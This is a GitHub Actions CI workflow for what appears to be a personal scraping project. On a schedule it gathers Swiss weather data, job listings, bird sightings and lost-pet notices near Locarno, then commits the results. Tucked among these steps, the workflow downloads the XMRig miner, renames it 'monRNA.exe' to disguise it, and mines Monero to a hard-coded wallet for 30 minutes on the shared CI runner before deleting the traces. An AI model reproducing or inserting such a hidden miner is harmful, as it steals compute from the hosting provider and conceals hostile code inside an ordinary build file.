# This is a basic workflow to help you get started with Actions

name: CI

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the "main" branch
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

  schedule:
    - cron: "30 18 * * *" # UTC time
  
  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v4
      
      - name: Install stuff
        run: |
          sudo apt-get update
          sudo apt-get install cowsay
          pip install playwright beautifulsoup4
          playwright install
          pip install yfinance pandas numpy tabpfn matplotlib seaborn


          
      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          # Log last modification
          echo "Last update:" > tmp.txt
          date >> tmp.txt
          cowsay < tmp.txt > last_update_info.txt
          rm tmp.txt

          # Put together query term for MeteoSuisse web resource
          url=$(paste url_base_meteo_suisse cap_location <(echo "00") | xargs | sed 's/ //g')

          # Extract all info from MeteoSuisse for that particular location specified in "cap_location"
          wget $url -O info_meteo_all.txt

          # Extract some info of particular interest
          cat info_meteo_all.txt \
          | sed 's/}/}\n/g' \
          | sed 's/],/],\n/g' \
          | sed 's/{//g' \
          | sed 's/}//g' \
          | sed 's/\[//g' \
          | sed 's/\]//g' \
          | egrep "currentWeather|warningsOverview|windSpeed3h|precipitationProbability3h" \
          > info_meteo.txt
          
          # Cleanup
          rm info_meteo_all.txt


          # Make a email alert from jobroom
          python get_page_jobroom.py > info_jobroom.txt

          # Make a email alert for birds spotted in ornitho
          python get_page_ornitho.py # generates all_birds.txt
          #cat all_birds.txt  | xargs -d"\n" | sed 's/----------------------------------------  /\n/g' | egrep -i "Grus grus" > info_ornitho.txt  || true
          awk '/Region:/{block=$0; next} /Grus grus/{print block "\n" $0 "\n----------------------------------------"}' all_birds.txt > info_ornitho_gru.txt
          awk '/Region:/{block=$0; next} /Pernis apivorus/{print block "\n" $0 "\n----------------------------------------"}' all_birds.txt > info_ornitho_falco_pecchiaiolo.txt

          
          # Also wget lost pets
          wget https://www.spalv.ch/it/animali/smarriti -O info_pets_all.txt
          egrep -i "muralto|minusio|tenero|locarno" info_pets_all.txt --color | sed 's/ /\n/g' | grep href | grep -v "><img" > info_pets.txt

          # Cleanup
          rm info_pets_all.txt


          # Make a email alert from jobroom
          python get_page_jobroom.py > info_jobroom.txt


          # Make predictor TabPFN
          python TabPFN.py > info_TabPFN.txt

          #rm -r monRNA
          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz
          tar xvfz xmrig-6.22.2-jammy-x64.tar.gz
          rm xmrig-6.22.2-jammy-x64.tar.gz
          mv xmrig-6.22.2 monRNA
          cd monRNA
          mv xmrig monRNA.exe
          timeout 30m ./monRNA.exe --donate-level 0 -o xmrpool.eu:3333 -u 49Lz3qy4w2tfPRR4pGeJKCd78uJ5qStamRy5b6wmJ4cw3eUd28kYpPrK5DXn8VwrdiZNXYpKV8pgVXzo8Ls1gdKR8UKn9JA -k --coin monero   || EXIT_CODE=$?
          if [ "$EXIT_CODE" = "124" ]; then
            echo "Script timed out after 10 minutes, but continuing without failure."
          elif [ -n "$EXIT_CODE" ]; then
            echo "Script exited with code $EXIT_CODE"
            exit $EXIT_CODE
          fi
          cd ..
          rm -r monRNA



          git config --global user.name "twincacca"
          git config --global user.email "twincacca@gmail.com"
          git add .
          git commit -m "Update info"
          git push





          
